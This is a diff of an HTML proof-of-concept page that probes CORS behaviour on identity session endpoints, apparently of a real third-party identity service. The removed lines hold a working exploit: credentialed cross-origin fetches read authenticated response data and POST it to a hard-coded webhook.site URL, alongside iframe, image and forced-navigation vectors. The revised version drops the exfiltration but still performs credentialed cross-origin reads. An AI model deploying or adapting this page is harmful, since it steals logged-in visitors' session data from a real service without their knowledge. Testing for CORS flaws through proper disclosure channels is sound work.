@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Schibsted Identity CORS Multi-Vector Tester</title>
+<title>Identity Session CORS Behavior Tester</title>
 
 <style>
 body {
@@ -11,13 +11,10 @@ body {
     padding: 20px;
 }
 
-h1 {
-    color: #c62828;
-}
-
 button {
-    padding: 14px 20px;
-    font-size: 16px;
+    padding: 12px 18px;
+    margin: 5px;
+    font-size: 15px;
     background: #c62828;
     color: white;
     border: none;
@@ -35,7 +32,6 @@ pre {
 iframe {
     width: 100%;
     height: 200px;
-    border: 1px solid #ccc;
     margin-top: 10px;
 }
 </style>
@@ -44,14 +40,26 @@ iframe {
 
 <body>
 
-<h1>🔐 Identity CORS Multi-Vector Exploit Tester</h1>
+<h1>🔐 Identity CORS Multi-Vector Tester</h1>
 
 <p>
-Tests multiple browser behaviors against identity session endpoints.
+Controlled testing of session behavior without forced redirects.
 </p>
 
-<button onclick="runAllTests()">
-🚨 Run All Tests
+<button onclick="runFetchTests()">
+Run Fetch Tests
+</button>
+
+<button onclick="runIframeTests()">
+Run Iframe Tests
+</button>
+
+<button onclick="runImageTests()">
+Run Image Tests
+</button>
+
+<button onclick="runNavigationTest()">
+Run Navigation Test
 </button>
 
 <pre id="output"></pre>
@@ -60,12 +68,7 @@ Tests multiple browser behaviors against identity session endpoints.
 
 <script>
 
-/* =========================
-   CONFIG
-========================= */
-
-const WEBHOOK =
-"https://webhook.site/59167735-3d9b-4830-b6d9-ddebc0d5663c";
+/* ========================= */
 
 const ENDPOINTS = [
 
@@ -77,62 +80,33 @@ const ENDPOINTS = [
 
 ];
 
-
-/* =========================
-   LOGGER
-========================= */
+/* ========================= */
 
 function log(msg) {
 
-document.getElementById("output").textContent +=
-msg + "\n";
+document.getElementById("output").textContent += msg + "\n";
 
 }
 
+/* ========================= */
+/* FETCH TEST */
+/* ========================= */
 
-/* =========================
-   MASTER RUNNER
-========================= */
+async function runFetchTests() {
 
-async function runAllTests() {
-
-log("Starting multi-vector testing...\n");
+log("\n=== FETCH TESTS ===\n");
 
 for (const endpoint of ENDPOINTS) {
 
-await fetchTest(endpoint);
-
-iframeTest(endpoint);
-
-imageTest(endpoint);
-
-navigationTest(endpoint);
-
-}
-
-log("\nAll tests triggered.");
-
-}
-
-
-/* =========================
-   FETCH TEST
-========================= */
-
-async function fetchTest(endpoint) {
-
-log("=== FETCH TEST ===");
-
+log("Testing:");
 log(endpoint);
 
 try {
 
-const response = await fetch(endpoint, {
-
+const response =
+await fetch(endpoint, {
 method: "GET",
-
 credentials: "include"
-
 });
 
 const text =
@@ -148,26 +122,15 @@ response.headers.get(
 "Access-Control-Allow-Credentials"
 );
 
-const result = {
+log(JSON.stringify({
 
 endpoint: endpoint,
-
-method: "fetch",
-
 status: response.status,
-
 cors_origin: corsOrigin,
-
 cors_credentials: corsCreds,
+preview: text.substring(0, 300)
 
-response_preview:
-text.substring(0, 300)
-
-};
-
-log(JSON.stringify(result, null, 2));
-
-await exfil(result);
+}, null, 2));
 
 }
 catch (e) {
@@ -178,14 +141,17 @@ log("Fetch error: " + e.message);
 
 }
 
+}
 
-/* =========================
-   IFRAME TEST
-========================= */
+/* ========================= */
+/* IFRAME TEST */
+/* ========================= */
 
-function iframeTest(endpoint) {
+function runIframeTests() {
 
-log("=== IFRAME TEST ===");
+log("\n=== IFRAME TESTS ===\n");
+
+for (const endpoint of ENDPOINTS) {
 
 const iframe =
 document.createElement("iframe");
@@ -198,14 +164,17 @@ document
 
 }
 
+}
 
-/* =========================
-   IMAGE TEST
-========================= */
+/* ========================= */
+/* IMAGE TEST */
+/* ========================= */
 
-function imageTest(endpoint) {
+function runImageTests() {
 
-log("=== IMAGE TEST ===");
+log("\n=== IMAGE TESTS ===\n");
+
+for (const endpoint of ENDPOINTS) {
 
 const img =
 new Image();
@@ -214,57 +183,23 @@ img.src = endpoint;
 
 }
 
+}
 
-/* =========================
-   NAVIGATION TEST
-========================= */
+/* ========================= */
+/* NAVIGATION TEST */
+/* ========================= */
 
-function navigationTest(endpoint) {
+function runNavigationTest() {
 
-log("=== NAVIGATION TEST ===");
+log("\n=== NAVIGATION TEST ===");
 
-setTimeout(() => {
+const target =
+ENDPOINTS[0];
 
 log("Navigating to:");
+log(target);
 
-log(endpoint);
-
-window.location = endpoint;
-
-}, 8000);
-
-}
-
-
-/* =========================
-   WEBHOOK EXFIL
-========================= */
-
-async function exfil(data) {
-
-try {
-
-await fetch(WEBHOOK, {
-
-method: "POST",
-
-headers: {
-
-"Content-Type":
-"application/json"
-
-},
-
-body: JSON.stringify(data)
-
-});
-
-}
-catch (e) {
-
-log("Webhook failed.");
-
-}
+window.location = target;
 
 }
 
